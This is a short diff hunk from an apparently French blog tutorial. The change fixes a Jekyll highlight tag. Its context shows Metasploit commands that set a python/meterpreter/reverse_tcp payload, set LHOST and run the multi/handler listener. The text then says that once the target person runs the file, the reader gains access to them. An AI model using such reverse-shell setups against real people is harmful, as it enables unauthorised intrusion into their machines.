@@ -142,7 +142,7 @@ payload => python/meterpreter/reverse_tcp
 msf5 exploit(multi/handler) > set LHOST (votreip)
 LHOST => (votreip)
 msf5 exploit(multi/handler) > run
-{% highlight bash %}
+{% endhighlight %}
 
 La session va donc être lancé puis il faudra que la personne exécute le fichier et voilà, vous aurez accès à votre cible.
 
